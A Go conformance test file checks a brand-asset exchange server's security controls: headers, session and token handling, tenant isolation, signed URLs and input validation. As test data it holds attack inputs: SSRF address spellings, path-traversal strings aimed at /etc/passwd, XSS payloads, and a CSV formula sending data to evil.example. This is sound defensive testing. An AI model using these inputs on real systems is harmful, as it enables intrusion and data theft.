package conformance

import (
	"bytes"
	"crypto/sha256"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/openbrandexchange/obx-go/nodeadmin"
	"github.com/openbrandexchange/obx-go/obx"
)

// ProfileSecurity checks the observable parts of the spec's security.md that
// the other profiles do not already cover. It needs admin credentials or a
// setup code and runs after the portal profile.
const ProfileSecurity = "security"

func init() {
	p := ProfileSecurity
	register(p, "S-HDR-1", "admin UI and file downloads carry the security headers of security.md §4; CORS only on discovery", false, testSecurityHeaders)
	register(p, "S-TOK-1", "upload keys, access tokens and sessions only work on their own API", true, testTokenSeparation)
	register(p, "S-SESS-1", "a logged-out session cookie is dead; retailers cannot use admin endpoints", true, testSessionEnd)
	register(p, "S-ISO-1", "exports, webhooks and access requests are bound to their owner (404 for others)", true, testOwnership)
	register(p, "S-URL-1", "signed file URLs cannot be moved to another file, stripped or extended", true, testSignedURLs)
	register(p, "S-SSRF-1", "import and webhook URLs: every spelling of a private address is refused", true, testSSRFSpellings)
	register(p, "S-UPL-1", "upload limits (413), magic-byte checks (415) and no SVG logo", true, testUploadLimits)
	register(p, "S-CSV-1", "CSV exports neutralise spreadsheet formulas", false, testCSVInjection)
	register(p, "S-PATH-1", "no path traversal out of the web UI folder", true, testStaticTraversal)
	register(p, "S-URLS-2", "user-supplied links must be http(s): no javascript: URLs", true, testLinkSchemes)
	register(p, "S-RATE-2", "failed logins and token requests are rate-limited per IP (with --rate-limit-test)", false, testLoginRateLimit)
}

// ---- helpers

func (t *T) rawGet(u string, h http.Header) *response {
	res, err := t.r.doOnce(t.ctx, http.MethodGet, u, nil, h)
	t.Check(err, "GET "+u)
	return res
}

// accessRequest posts an access request without waiting out a 429 (access
// requests are rate-limited per IP). ok is false when the node rate-limited it.
func (t *T) accessRequest(in obx.AccessRequestInput) (ar *obx.AccessRequest, res *response, ok bool) {
	body, _ := json.Marshal(in)
	res, err := t.r.doOnce(withoutRateRetry(t.ctx), http.MethodPost, t.r.cfg.BaseURL+obx.PathAPIBase+"/access-requests", body, http.Header{"Content-Type": {"application/json"}})
	t.Check(err, "POST /access-requests")
	if res.status == http.StatusTooManyRequests {
		t.Notef("access requests are rate-limited right now; that check was not run")
		return nil, res, false
	}
	if res.status == http.StatusCreated || res.status == http.StatusOK || res.status == http.StatusAccepted {
		ar = &obx.AccessRequest{}
		res.decode(ar)
	}
	return ar, res, true
}

func (t *T) securityAdmin() {
	if t.r.admin == nil {
		t.Skip("needs admin credentials or a setup code")
	}
}

// ---- tests

func testSecurityHeaders(t *T) {
	t.securityAdmin()
	res := t.rawGet(t.r.cfg.AdminURL+"/", nil)
	if res.status != http.StatusOK {
		t.Fatalf("GET /: %d", res.status)
	}
	csp := res.header.Get("Content-Security-Policy")
	switch {
	case csp == "":
		t.Errorf("the admin UI has no Content-Security-Policy")
	default:
		script := cspDirective(csp, "script-src")
		if script == "" {
			script = cspDirective(csp, "default-src")
		}
		if strings.Contains(script, "'unsafe-inline'") || strings.Contains(script, "'unsafe-eval'") || script == "" {
			t.Errorf("CSP allows inline or eval'd script (or sets no script-src): %s", csp)
		}
		if !strings.Contains(cspDirective(csp, "frame-ancestors"), "'none'") && !strings.EqualFold(res.header.Get("X-Frame-Options"), "DENY") {
			t.Errorf("the admin UI can be framed: no frame-ancestors 'none' and no X-Frame-Options: DENY")
		}
	}
	if res.header.Get("Referrer-Policy") == "" {
		t.Errorf("the admin UI sets no Referrer-Policy")
	}
	if !strings.EqualFold(res.header.Get("X-Content-Type-Options"), "nosniff") {
		t.Errorf("the admin UI sets no X-Content-Type-Options: nosniff")
	}
	if t.r.full != nil {
		a := t.r.products["KO-1001"]
		if a != nil && len(a.Assets) > 0 && a.Assets[0].Renditions.Web.URL != "" {
			f := t.rawGet(a.Assets[0].Renditions.Web.URL, nil)
			if f.status == http.StatusUnauthorized {
				tok, _ := t.r.full.Token(t.ctx)
				f = t.rawGet(a.Assets[0].Renditions.Web.URL, bearerHeader(tok))
			}
			checkContentHeaders(t, "rendition download", f, false)
		}
	}
	c, _ := t.portalUser("OBX security: headers", nodeadmin.RetailerInput{})
	status, h, _ := t.download(c, "/portal/assets/"+t.assetID("KO-1001_NVY_1")+"/download?variant=web")
	checkContentHeaders(t, "portal image download", &response{status: status, header: h}, true)
	checkNoCORS(t)
}

// checkNoCORS: only the discovery document is CORS-enabled (protocol.md §2).
// The protocol, ingest and admin APIs never tell a browser that a foreign
// page's script may read their answers.
func checkNoCORS(t *T) {
	withOrigin := func(h http.Header) http.Header {
		if h == nil {
			h = http.Header{}
		}
		h.Set("Origin", "https://other-site.example")
		return h
	}
	check := func(what, u string, h http.Header) {
		res := t.rawGet(u, withOrigin(h))
		if v := res.header.Get("Access-Control-Allow-Origin"); v != "" {
			t.Errorf("%s answers another website with Access-Control-Allow-Origin: %s; only /.well-known/obx may send CORS headers", what, v)
		}
	}
	if t.r.full != nil {
		tok, err := t.r.full.Token(t.ctx)
		t.Check(err, "token")
		check("the protocol API (/changes)", t.r.cfg.BaseURL+obx.PathAPIBase+"/changes?limit=1", bearerHeader(tok))
	}
	if t.r.cfg.IngestToken != "" {
		check("the Ingest API", t.r.cfg.BaseURL+obx.PathIngest, bearerHeader(t.r.cfg.IngestToken))
	}
	check("the admin API", t.r.cfg.AdminURL+obx.PathAdminAPI+"/session", nil)
}

func cspDirective(csp, name string) string {
	for _, part := range strings.Split(csp, ";") {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToLower(part), name+" ") || strings.EqualFold(part, name) {
			return part
		}
	}
	return ""
}

func checkContentHeaders(t *T, what string, res *response, attachment bool) {
	if res.status != http.StatusOK {
		t.Errorf("%s: %d", what, res.status)
		return
	}
	if !strings.Contains(strings.ToLower(res.header.Get("Cache-Control")), "private") && !strings.Contains(strings.ToLower(res.header.Get("Cache-Control")), "no-store") {
		t.Errorf("%s: Cache-Control %q is not private", what, res.header.Get("Cache-Control"))
	}
	if !strings.EqualFold(res.header.Get("X-Content-Type-Options"), "nosniff") {
		t.Errorf("%s: no X-Content-Type-Options: nosniff", what)
	}
	if attachment && !strings.HasPrefix(strings.ToLower(res.header.Get("Content-Disposition")), "attachment") {
		t.Errorf("%s: Content-Disposition %q is not an attachment", what, res.header.Get("Content-Disposition"))
	}
}

func testTokenSeparation(t *T) {
	t.securityAdmin()
	if t.r.full == nil || t.r.cfg.IngestToken == "" {
		t.Skip("needs an API key and an upload key")
	}
	api := t.r.cfg.BaseURL + obx.PathAPIBase
	if res := t.rawGet(api+"/products?limit=1", bearerHeader(t.r.cfg.IngestToken)); res.status != http.StatusUnauthorized {
		t.Errorf("an upload key on GET /obx/v1/products: %d, want 401", res.status)
	}
	tok, err := t.r.full.Token(t.ctx)
	t.Check(err, "token")
	if res := t.rawGet(t.r.cfg.BaseURL+obx.PathIngest+"/products/KO-1001", bearerHeader(tok)); res.status != http.StatusUnauthorized {
		t.Errorf("an access token on the ingest API: %d, want 401", res.status)
	}
	for _, p := range []string{"/settings", "/retailers", "/portal/products"} {
		if res := t.rawGet(t.r.cfg.AdminURL+obx.PathAdminAPI+p, bearerHeader(tok)); res.status == http.StatusOK {
			t.Errorf("an access token was accepted on GET /admin/api%s", p)
		}
	}
	// The client secret itself is no bearer token either.
	if res := t.rawGet(api+"/products?limit=1", bearerHeader(t.r.fullCreds[1])); res.status != http.StatusUnauthorized {
		t.Errorf("a client secret used as bearer token: %d, want 401", res.status)
	}
}

func testSessionEnd(t *T) {
	t.securityAdmin()
	c, _ := t.portalUser("OBX security: sessions", nodeadmin.RetailerInput{})
	for _, p := range []string{"/settings", "/retailers", "/users", "/api-clients", "/ingest-tokens", "/stats", "/import-sources", "/webhooks", "/access-requests"} {
		status, _, _ := t.download(c, p)
		if status != http.StatusForbidden && status != http.StatusNotFound {
			t.Errorf("a retailer user GET /admin/api%s: %d, want 403", p, status)
		}
	}
	if err := c.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/retailers", map[string]any{"name": "Sneaky"}, nil); err == nil {
		t.Errorf("a retailer user could create a retailer")
	}
	// Replaying the session cookie after logout must not work.
	hc := t.r.jarClient()
	res := t.rawJSON(hc, http.MethodGet, "/session", nil, "")
	var s nodeadmin.Session
	res.decode(&s)
	res = t.rawJSON(hc, http.MethodPost, "/session/login", map[string]string{"email": t.r.cfg.AdminEmail, "password": t.r.cfg.AdminPassword}, s.CSRFToken)
	if res.status != http.StatusOK {
		t.Fatalf("login: %d", res.status)
	}
	res.decode(&s)
	sc, ok := cookieFlags(res.header, "obx_session")
	if !ok {
		t.Fatalf("login set no obx_session cookie")
	}
	cookie := strings.SplitN(sc, ";", 2)[0]
	if r := t.rawJSON(hc, http.MethodPost, "/session/logout", nil, s.CSRFToken); r.status >= 300 {
		t.Fatalf("logout: %d", r.status)
	}
	req, _ := http.NewRequestWithContext(t.ctx, http.MethodGet, t.r.cfg.AdminURL+obx.PathAdminAPI+"/settings", nil)
	req.Header.Set("Cookie", cookie)
	resp, err := t.r.hc.Do(req)
	t.Check(err, "replay")
	resp.Body.Close()
	if resp.StatusCode != http.StatusUnauthorized {
		t.Errorf("the session cookie still works after logout: %d", resp.StatusCode)
	}
	// Session fixation: a session id planted before login must not become
	// the logged-in session.
	fix := t.r.jarClient()
	pre := t.rawJSON(fix, http.MethodGet, "/session", nil, "")
	pre.decode(&s)
	before, hadCookie := cookieFlags(pre.header, "obx_session")
	res = t.rawJSON(fix, http.MethodPost, "/session/login", map[string]string{"email": t.r.cfg.AdminEmail, "password": t.r.cfg.AdminPassword}, s.CSRFToken)
	after, _ := cookieFlags(res.header, "obx_session")
	if hadCookie && strings.SplitN(before, ";", 2)[0] == strings.SplitN(after, ";", 2)[0] {
		t.Errorf("login kept the session id of the anonymous session (session fixation)")
	}
	// Changing the password ends the other sessions of that user.
	u, _ := t.portalUser("OBX security: password change", nodeadmin.RetailerInput{})
	u2 := t.r.newAdmin()
	sess, err := u.Session(t.ctx)
	t.Check(err, "session")
	if sess.User == nil {
		t.Fatalf("no user in the portal session")
	}
	_, err = u2.Login(t.ctx, sess.User.Email, "portal-buyer-password")
	t.Check(err, "second login")
	t.Check(u.Call(t.ctx, http.MethodPatch, obx.PathAdminAPI+"/me", map[string]any{"current_password": "portal-buyer-password", "new_password": "another-portal-password"}, nil), "change password")
	if status, _, _ := t.download(u2, "/portal/viewer"); status != http.StatusUnauthorized {
		t.Errorf("another session of the user still works after a password change: %d", status)
	}
	if status, _, _ := t.download(u, "/portal/viewer"); status != http.StatusOK {
		t.Errorf("the session that changed the password should stay logged in: %d", status)
	}
}

func testOwnership(t *T) {
	t.securityAdmin()
	if t.r.full == nil || t.r.second == nil {
		t.Skip("needs two API keys")
	}
	d := t.r.discovery
	if d == nil || d.Has(obx.CapExports) {
		e, err := t.r.full.CreateExport(t.ctx, obx.ExportRequest{Renditions: []string{obx.RenditionThumb}}, "")
		if err == nil {
			for _, p := range []string{"/exports/" + e.ID, "/exports/" + e.ID + "/manifest", "/exports/" + e.ID + "/parts/1"} {
				if res := t.get(t.r.second, p); res.status != http.StatusNotFound {
					t.Errorf("another retailer's key GET %s: %d, want 404", p, res.status)
				}
			}
		} else if !obx.IsCode(err, obx.ErrNotImplemented) {
			t.Errorf("create export: %v", err)
		}
	}
	// The brand-restricted key's export and GTIN lookup stay inside its grant.
	if d == nil || d.Has(obx.CapExports) {
		if e, err := t.r.second.CreateExport(t.ctx, obx.ExportRequest{Renditions: []string{obx.RenditionThumb}}, ""); err == nil {
			if e, err = t.r.second.WaitExport(t.ctx, e.ID, 300*time.Millisecond); err == nil {
				err = t.r.second.ExportManifest(t.ctx, e, func(l *obx.ExportManifestLine) error {
					if l.Type == obx.KindProduct && bytes.Contains(l.Data, []byte(`"KT-`)) {
						t.Errorf("the export of a key restricted to brand kestrel contains a Kestrel Trail product")
					}
					return nil
				})
			}
			if err != nil {
				t.Errorf("restricted export: %v", err)
			}
		}
	}
	if res, err := t.r.second.LookupGTINs(t.ctx, []string{"2000200101017"}); err == nil && len(res.Products) > 0 {
		t.Errorf("a key restricted to brand kestrel found a Kestrel Trail EAN")
	}
	if d == nil || d.Has(obx.CapWebhooks) {
		sub, err := t.r.full.CreateWebhook(t.ctx, obx.WebhookInput{URL: "https://hooks.kestrel.example/obx", Events: []string{obx.EventChangesAvailable}})
		if err == nil {
			if list, err := t.r.second.Webhooks(t.ctx); err == nil {
				for _, s := range list {
					if s.ID == sub.ID {
						t.Errorf("another retailer's key lists this webhook")
					}
				}
			}
			if _, err := t.r.second.TestWebhook(t.ctx, sub.ID); err == nil || !obx.IsCode(err, obx.ErrNotFound) {
				t.Errorf("another retailer's key POST /webhooks/{id}/test: %v, want 404", err)
			}
			if err := t.r.second.DeleteWebhook(t.ctx, sub.ID); err == nil || !obx.IsCode(err, obx.ErrNotFound) {
				t.Errorf("another retailer's key DELETE /webhooks/{id}: %v, want 404", err)
			}
			t.r.full.DeleteWebhook(t.ctx, sub.ID)
		} else if !obx.IsCode(err, obx.ErrUnsafeURL) { // a node may resolve the host at creation
			t.Notef("could not create a webhook to test ownership: %v", err)
		}
	}
	if d == nil || d.Has(obx.CapAccessRequests) {
		mk := func(who string) obx.AccessRequestInput {
			return obx.AccessRequestInput{Retailer: obx.AccessRequestRetailer{Name: who + " Boutique " + randomSuffix()},
				Contact: obx.AccessRequestContact{Name: who + " Example", Email: strings.ToLower(who) + "+" + randomSuffix() + "@boutique.example"}, Access: []string{"api"}, RequestedBrandIDs: []string{}}
		}
		ar, _, ok1 := t.accessRequest(mk("Sam"))
		other, _, ok2 := t.accessRequest(mk("Kim"))
		if ok1 && ok2 && ar != nil && other != nil {
			anon := t.r.newClient("", "")
			if _, err := anon.PollAccessRequest(t.ctx, ar.ID, other.RequestToken); err == nil {
				t.Errorf("an access request can be polled with another request's token")
			}
		}
	}
	// A retailer user never sees another retailer's download job or keys.
	a, _ := t.portalUser("OBX security: owner A", nodeadmin.RetailerInput{})
	b, _ := t.portalUser("OBX security: owner B", nodeadmin.RetailerInput{})
	var job struct {
		ID string `json:"id"`
	}
	if err := a.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/portal/download-jobs", map[string]any{"source": "products", "product_ids": []string{t.productID("KO-1001")}, "variant": "web"}, &job); err == nil && job.ID != "" {
		if status, _, _ := t.download(b, "/portal/download-jobs/"+job.ID); status != http.StatusNotFound {
			t.Errorf("retailer B GET retailer A's download job: %d, want 404", status)
		}
		var list struct {
			Items []struct {
				ID string `json:"id"`
			} `json:"items"`
		}
		b.Call(t.ctx, http.MethodGet, obx.PathAdminAPI+"/portal/download-jobs", nil, &list)
		for _, it := range list.Items {
			if it.ID == job.ID {
				t.Errorf("retailer B lists retailer A's download job")
			}
		}
	}
	// Self-service API keys: B can neither see, rotate nor revoke A's key.
	if _, err := t.r.admin.PatchSettings(t.ctx, map[string]any{"portal": map[string]any{"retailer_api_self_service": true}}); err == nil {
		var key struct {
			Client struct {
				ID string `json:"id"`
			} `json:"client"`
		}
		if err := a.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/portal/api-clients", map[string]any{"name": "Shop sync"}, &key); err == nil && key.Client.ID != "" {
			if err := b.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/portal/api-clients/"+key.Client.ID+"/rotate", nil, nil); !obx.IsCode(err, obx.ErrNotFound) {
				t.Errorf("retailer B rotating retailer A's API key: %v, want 404", err)
			}
			if err := b.Call(t.ctx, http.MethodDelete, obx.PathAdminAPI+"/portal/api-clients/"+key.Client.ID, nil, nil); !obx.IsCode(err, obx.ErrNotFound) {
				t.Errorf("retailer B revoking retailer A's API key: %v, want 404", err)
			}
			status, _, body := t.download(b, "/portal/api-clients")
			if status == http.StatusOK && bytes.Contains(body, []byte(key.Client.ID)) {
				t.Errorf("retailer B lists retailer A's API key")
			}
		} else if err != nil {
			t.Notef("self-service API key could not be created: %v", err)
		}
		t.r.admin.PatchSettings(t.ctx, map[string]any{"portal": map[string]any{"retailer_api_self_service": false}})
	}
	var sel struct {
		ProductIDs []string `json:"product_ids"`
	}
	a.Call(t.ctx, http.MethodPut, obx.PathAdminAPI+"/portal/selection", map[string]any{"product_ids": []string{t.productID("KO-1003")}}, nil)
	b.Call(t.ctx, http.MethodGet, obx.PathAdminAPI+"/portal/selection", nil, &sel)
	if obx.Contains(sel.ProductIDs, t.productID("KO-1003")) {
		t.Errorf("retailer B sees retailer A's selection")
	}
}

func testSignedURLs(t *T) {
	if t.r.full == nil {
		t.Skip("needs an API key")
	}
	p1, p2 := t.r.products["KO-1001"], t.r.products["KO-1005"]
	if p1 == nil || p2 == nil || len(p1.Assets) == 0 || len(p2.Assets) == 0 || p1.Assets[0].Renditions.Web.URL == "" {
		t.Skip("fixture products missing")
	}
	a, b := p1.Assets[0], p2.Assets[0]
	fresh, err := t.r.full.Asset(t.ctx, a.ID)
	t.Check(err, "asset")
	u := fresh.Renditions.Web.URL
	if res := t.rawGet(u, nil); res.status == http.StatusUnauthorized {
		t.Skip("rendition URLs need the bearer token (not signed)")
	} else if res.status != http.StatusOK {
		t.Fatalf("signed URL: %d", res.status)
	}
	parsed, err := url.Parse(u)
	t.Check(err, "parse URL")
	check := func(what, target string) {
		if res := t.rawGet(target, nil); res.status == http.StatusOK {
			t.Errorf("%s still downloads (%s)", what, target)
		}
	}
	if strings.Contains(u, a.ID) {
		check("the signed URL moved to another asset", strings.Replace(u, a.ID, b.ID, 1))
	}
	check("the signed URL moved to the original", strings.Replace(u, "/web", "/original", 1))
	stripped := *parsed
	stripped.RawQuery = ""
	check("the signed URL without its query", stripped.String())
	q := parsed.Query()
	for k, vs := range q {
		lk := strings.ToLower(k)
		if strings.Contains(lk, "exp") && len(vs) == 1 {
			q2 := parsed.Query()
			q2.Set(k, "9999999999")
			ext := *parsed
			ext.RawQuery = q2.Encode()
			check("the signed URL with a later expiry", ext.String())
		}
		if strings.Contains(lk, "sig") && len(vs) == 1 {
			q2 := parsed.Query()
			sum := sha256.Sum256([]byte(vs[0]))
			q2.Set(k, hex.EncodeToString(sum[:])[:len(vs[0])])
			bad := *parsed
			bad.RawQuery = q2.Encode()
			check("the signed URL with another signature", bad.String())
		}
	}
	// A signed URL of an asset that is taken offline stops working: it is no
	// capability that outlives the brand's decision (security.md §1, §4).
	if t.r.ing != nil {
		ext := a.ExternalID
		if _, err := t.r.ing.Unpublish(t.ctx, obx.KindAsset, ext); err == nil {
			res := t.rawGet(u, nil)
			if res.status == http.StatusOK {
				t.Errorf("a signed URL still downloads the asset after it was unpublished")
			}
			t.r.ing.Publish(t.ctx, obx.KindAsset, ext)
		}
	}
}

// ssrfSpellings are loopback, private and metadata addresses written in
// ways a naive string check misses. The canonical spellings must be refused
// when the URL is saved. The numeric shorthands (127.1, one big number, hex,
// octal) are not valid IP literals everywhere, so a node may treat them as
// host names and check the address they resolve to when it connects; those
// may be saved, but the test fetch or delivery must not succeed.
var ssrfSpellings = []struct {
	url          string
	alwaysUnsafe bool // refused even with OBX_ALLOW_PRIVATE_URLS=true
	shorthand    bool
}{
	{"https://169.254.169.254/latest/meta-data/", true, false},
	{"https://[::ffff:169.254.169.254]/latest/", true, false},
	{"https://[fe80::1]/x.csv", true, false},
	{"https://2852039166/latest/", true, true}, // 169.254.169.254 as one number
	{"https://127.0.0.1/x.csv", false, false},
	{"https://[::1]/x.csv", false, false},
	{"https://[::ffff:127.0.0.1]/x.csv", false, false},
	{"https://[::ffff:7f00:1]/x.csv", false, false},
	{"https://0.0.0.0/x.csv", false, false},
	{"https://localhost/x.csv", false, false},
	{"https://10.0.0.1/x.csv", false, false},
	{"https://172.16.0.1/x.csv", false, false},
	{"https://192.168.1.1/x.csv", false, false},
	{"https://100.64.0.1/x.csv", false, false},
	{"https://[fd00::1]/x.csv", false, false},
	{"https://127.1/x.csv", false, true},
	{"https://2130706433/x.csv", false, true},
	{"https://0x7f000001/x.csv", false, true},
	{"https://0177.0.0.1/x.csv", false, true},
	{"file:///etc/passwd", true, false},
	{"gopher://127.0.0.1:25/", true, false},
	{"ftp://example.com/x.csv", true, false},
}

func testSSRFSpellings(t *T) {
	t.securityAdmin()
	strict := t.r.privateURLsAllowed == nil || !*t.r.privateURLsAllowed
	refused := func(err error) bool {
		return obx.IsCode(err, obx.ErrUnsafeURL) || obx.IsCode(err, obx.ErrValidationFailed)
	}
	for _, c := range ssrfSpellings {
		if !strict && !c.alwaysUnsafe {
			continue
		}
		// Scheduled import: refused when saved, or (shorthands) at the test fetch.
		var src obx.ImportSource
		err := t.r.admin.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/import-sources", map[string]any{"name": "SSRF spelling", "kind": "https_url", "enabled": false, "config": map[string]any{"url": c.url}}, &src)
		switch {
		case err == nil:
			var out map[string]any
			terr := t.r.admin.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/import-sources/"+src.ID+"/test", nil, &out)
			if terr == nil && out["ok"] == true {
				t.Errorf("import source %s: the test fetch succeeded", c.url)
			} else if !c.shorthand {
				t.Errorf("import source %s was saved; want 422 unsafe_url", c.url)
			}
			t.r.admin.Call(t.ctx, http.MethodDelete, obx.PathAdminAPI+"/import-sources/"+src.ID, nil, nil)
		case !refused(err):
			t.Errorf("import source %s: want 422 unsafe_url, got %v", c.url, err)
		}
		// Brand webhooks.
		var hook map[string]any
		err = t.r.admin.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/webhooks", map[string]any{"url": c.url, "events": []string{obx.EventImportRunCompleted}}, &hook)
		if err == nil {
			id := fmt.Sprint(hook["id"])
			if sub, _ := hook["subscription"].(map[string]any); sub != nil {
				id = fmt.Sprint(sub["id"])
			}
			var out map[string]any
			terr := t.r.admin.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/webhooks/"+id+"/test", nil, &out)
			if terr == nil && out["delivered"] == true {
				t.Errorf("brand webhook %s: the test delivery succeeded", c.url)
			} else if !c.shorthand {
				t.Errorf("brand webhook to %s was saved; want 422 unsafe_url", c.url)
			}
			t.r.admin.Call(t.ctx, http.MethodDelete, obx.PathAdminAPI+"/webhooks/"+id, nil, nil)
		} else if !refused(err) {
			t.Errorf("brand webhook %s: want 422 unsafe_url, got %v", c.url, err)
		}
		// Retailer webhooks.
		if t.r.full != nil && (t.r.discovery == nil || t.r.discovery.Has(obx.CapWebhooks)) {
			sub, err := t.r.full.CreateWebhook(t.ctx, obx.WebhookInput{URL: c.url, Events: []string{obx.EventChangesAvailable}})
			if err == nil {
				if res, terr := t.r.full.TestWebhook(t.ctx, sub.ID); terr == nil && res.Delivered {
					t.Errorf("retailer webhook %s: the test delivery succeeded", c.url)
				} else if !c.shorthand {
					t.Errorf("retailer webhook to %s was saved; want 422 unsafe_url", c.url)
				}
				t.r.full.DeleteWebhook(t.ctx, sub.ID)
			} else if !refused(err) {
				t.Errorf("retailer webhook %s: want 422 unsafe_url, got %v", c.url, err)
			}
		}
	}
}

func testUploadLimits(t *T) {
	t.securityAdmin()
	if t.r.ing == nil || t.r.info == nil {
		t.Skip("needs an upload key")
	}
	base := t.r.cfg.BaseURL + obx.PathIngest
	send := func(method, u string, body io.Reader, size int64, ct string) *response {
		req, _ := http.NewRequestWithContext(t.ctx, method, u, body)
		req.ContentLength = size
		req.Header.Set("Authorization", "Bearer "+t.r.cfg.IngestToken)
		req.Header.Set("Content-Type", ct)
		resp, err := t.r.hc.Do(req)
		if err != nil {
			// A node may close the connection once it has answered 413.
			return &response{status: -1, body: []byte(err.Error())}
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		return &response{status: resp.StatusCode, header: resp.Header, body: b}
	}
	if max := t.r.info.Limits.MaxUploadBytes; max > 0 && max <= 512<<20 {
		sha := strings.Repeat("ab", 32)
		res := send(http.MethodPut, base+"/blobs/"+sha, io.LimitReader(zeroReader{}, max+1), max+1, "image/jpeg")
		if res.status != http.StatusRequestEntityTooLarge && res.status != -1 {
			t.Errorf("a blob of max_upload_bytes+1: %d %s, want 413", res.status, truncate(res.body))
		}
	}
	if max := t.r.info.Limits.MaxObjectBytes; max > 0 && max <= 64<<20 {
		big := `{"style_number":"S-BIG","name":{"en":"` + strings.Repeat("x", int(max)+10) + `"}}`
		res := send(http.MethodPut, base+"/products/S-BIG", strings.NewReader(big), int64(len(big)), "application/json")
		if res.status != http.StatusRequestEntityTooLarge && res.status != -1 {
			t.Errorf("a JSON object over max_object_bytes: %d, want 413", res.status)
		}
	}
	html := []byte("<html><body><script>alert(document.cookie)</script></body></html>")
	sum := sha256.Sum256(html)
	res := send(http.MethodPut, base+"/blobs/"+hex.EncodeToString(sum[:]), bytes.NewReader(html), int64(len(html)), "image/png")
	if res.status != http.StatusUnsupportedMediaType {
		t.Errorf("HTML uploaded as image/png: %d, want 415", res.status)
	}
	svg := []byte(`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`)
	resp, err := t.r.admin.Raw(t.ctx, http.MethodPut, obx.PathAdminAPI+"/settings/logo", svg, "image/svg+xml", true)
	t.Check(err, "PUT logo")
	resp.Body.Close()
	if resp.StatusCode < 400 {
		t.Errorf("an SVG logo was accepted (%d)", resp.StatusCode)
		t.r.admin.Raw(t.ctx, http.MethodDelete, obx.PathAdminAPI+"/settings/logo", nil, "", true)
	}
}

type zeroReader struct{}

func (zeroReader) Read(p []byte) (int, error) {
	clear(p)
	return len(p), nil
}

func testCSVInjection(t *T) {
	t.securityAdmin()
	if t.r.ing == nil {
		t.Skip("needs an upload key")
	}
	payload := `=HYPERLINK("https://evil.example/?"&A1,"Click")`
	_, err := t.r.ing.Put(t.ctx, obx.KindProduct, "S-CSV-1", map[string]any{"brand_external_id": "kestrel", "style_number": "S-CSV-1", "name": map[string]any{"en": payload, "nl": "+SUM(1,1)"}}, nil)
	t.Check(err, "PUT product")
	defer t.r.ing.Delete(t.ctx, obx.KindProduct, "S-CSV-1")
	c, _ := t.portalUser("OBX security: csv", nodeadmin.RetailerInput{})
	status, _, body := t.download(c, "/portal/products/data.csv?q=S-CSV-1")
	if status != http.StatusOK {
		t.Fatalf("data.csv: %d", status)
	}
	rows, err := csv.NewReader(bytes.NewReader(bytes.TrimPrefix(body, []byte("\xef\xbb\xbf")))).ReadAll()
	if err != nil {
		t.Fatalf("data.csv is not CSV: %v", err)
	}
	found := false
	for _, row := range rows {
		for _, cell := range row {
			if strings.Contains(cell, "HYPERLINK") || strings.Contains(cell, "SUM(1,1)") {
				found = true
				if strings.HasPrefix(cell, "=") || strings.HasPrefix(cell, "+") {
					t.Errorf("formula cell exported as is: %q", cell)
				}
			}
		}
	}
	if !found {
		t.Notef("the product did not appear in data.csv; nothing checked")
	}
}

func testStaticTraversal(t *T) {
	for _, p := range []string{
		"/..%2f..%2f..%2f..%2fetc%2fpasswd",
		"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
		"/assets/..%2f..%2f..%2f..%2fetc%2fpasswd",
		"/locales/..%2f..%2fpackage.json",
		"/locales/..%2f..%2fgo.mod",
		"/locales/..%2f..%2fcomposer.json",
		"/..%5c..%5c..%5cetc%5cpasswd",
		"/admin/api/public/logo/..%2f..%2f..%2fetc%2fpasswd",
		"/.env",
		"/data/obx.sqlite",
		"/config/config.php",
	} {
		res := t.rawGet(t.r.cfg.BaseURL+p, nil)
		b := string(res.body)
		if res.status == http.StatusOK && (strings.Contains(b, "root:") || strings.Contains(b, "\nmodule ") || strings.HasPrefix(b, "module ") ||
			strings.Contains(b, `"dependencies"`) || strings.Contains(b, `"require"`) || strings.HasPrefix(b, "SQLite format") || strings.Contains(b, "OBX_SECRET_KEY") || strings.Contains(b, "<?php")) {
			t.Errorf("GET %s serves a file outside the UI: %s", p, truncate(res.body))
		}
	}
}

func testLinkSchemes(t *T) {
	t.securityAdmin()
	if t.r.ing != nil {
		_, err := t.r.ing.Put(t.ctx, obx.KindBrand, "s-urls-2", map[string]any{"name": "Link test", "website": "javascript:alert(document.cookie)"}, nil)
		if err == nil {
			t.Errorf("a brand website javascript: URL was accepted")
			t.r.ing.Delete(t.ctx, obx.KindBrand, "s-urls-2")
		}
		_, err = t.r.ing.Put(t.ctx, obx.KindProduct, "S-URLS-2", map[string]any{"brand_external_id": "kestrel", "style_number": "S-URLS-2", "name": map[string]any{"en": "x"}, "dpp_url": "javascript:alert(1)"}, nil)
		if err == nil {
			t.Errorf("a product dpp_url javascript: URL was accepted")
			t.r.ing.Delete(t.ctx, obx.KindProduct, "S-URLS-2")
		}
	}
	if ar, res, ok := t.accessRequest(obx.AccessRequestInput{Retailer: obx.AccessRequestRetailer{Name: "Link Boutique " + randomSuffix(), Website: obx.Ptr("javascript:alert(document.cookie)")},
		Contact: obx.AccessRequestContact{Name: "Lee Example", Email: "lee+" + randomSuffix() + "@boutique.example"}, Access: []string{"portal"}, RequestedBrandIDs: []string{}}); ok && res.status < 300 {
		t.Errorf("an access request with a javascript: website was accepted (the admin sees it as a link): %v", ar != nil)
	}
	err := t.r.admin.Call(t.ctx, http.MethodPatch, obx.PathAdminAPI+"/settings", map[string]any{"company": map[string]any{"website": "javascript:alert(1)"}}, nil)
	if err == nil {
		t.Errorf("a company website javascript: URL was accepted")
	}
}

func testLoginRateLimit(t *T) {
	t.securityAdmin()
	if !t.r.cfg.RateLimitTest {
		t.Skip("run with --rate-limit-test (it locks this IP out of logins for a while)")
	}
	ctx := withoutRateRetry(t.ctx)
	hc := t.r.jarClient()
	res := t.rawJSON(hc, http.MethodGet, "/session", nil, "")
	var s nodeadmin.Session
	res.decode(&s)
	limited := false
	for i := 0; i < 60 && !limited; i++ {
